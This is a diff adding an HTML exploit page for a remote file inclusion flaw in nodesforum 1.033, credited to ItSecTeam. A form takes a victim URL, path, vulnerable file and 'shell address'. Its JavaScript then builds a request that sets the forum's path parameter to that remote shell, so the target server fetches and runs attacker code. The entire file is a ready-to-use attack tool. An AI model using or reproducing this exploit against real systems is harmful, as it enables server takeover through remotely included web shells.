@@ -1,0 +1,65 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
+<title>coded by ahmadbady</title>
+
+<script language="JavaScript">
+
+//===========================================================================
+//( #Topic    : nodesforum_1.033
+//( #Bug type : multi remote file include
+//( #Advisory : 
+//===========================================================================
+//( #Author : ItSecTeam
+//( #Email  : Bug@ITSecTeam.com
+//( #Website: http://www.itsecteam.com
+//( #Forum  : http://forum.ITSecTeam.com
+//vuls---------------------------------------------------------------------
+//erase_user_data.php line 6;
+//pre_output.php line 16 ;
+//--------------------------------------------------------------------------
+
+var variable1 ="?_nodesforum_path_from_here_to_nodesforum_folder="
+var variable2 ="?_nodesforum_code_path="
+  
+ function it(){
+  if (xpl.file.value=="pre_output.php"){
+          variable1 = variable2;
+         
+                              }
+                xpl.action= xpl.victim.value+xpl.path.value+xpl.file.value+variable1+xpl.shell.value;xpl.submit();                                        
+            }
+</script>
+
+</head>
+
+<body bgcolor="#FFFFFF">
+
+<p align="left"><font color="#FF0000">vul1 file:/path/erase_user_data.php</font></p>
+<p align="left"><font color="#FF0000">vul2 file:/path/pre_output.php</font></p>
+<p align="left"><font color="#0000FF">-----------------------------------</font></p>
+<form method="post" name="xpl" onSubmit="it();">
+    <p align="left">
+    <font 
+size="2" face="Tahoma">
+  	victim:
+  	<input type="text" name="victim" size="20";" style="color: #FFFFFF; background-color: #000000"> 
+	path:
+	<input type="text" name="path" size="20";" style="color: #FFFFFF; background-color: #000000"> 
+	file:
+	<input type="text" name="file" size="20";" style="color: #FFFFFF; background-color: #000000"> 
+	shell address:
+	<input type="text" name="shell" size="20";" style="color: #FFFFFF; background-color: #000000"></p>
+  	</p>
+<center>
+
+</p>
+  <p><input type="submit" value="GO" name="B1" style="float: left"><input type="reset" 
+value="reset" name="B2" style="float: left"></p>
+</form>
+<p><br>
+ </p>
+</center>
+</body>
+
+</html>
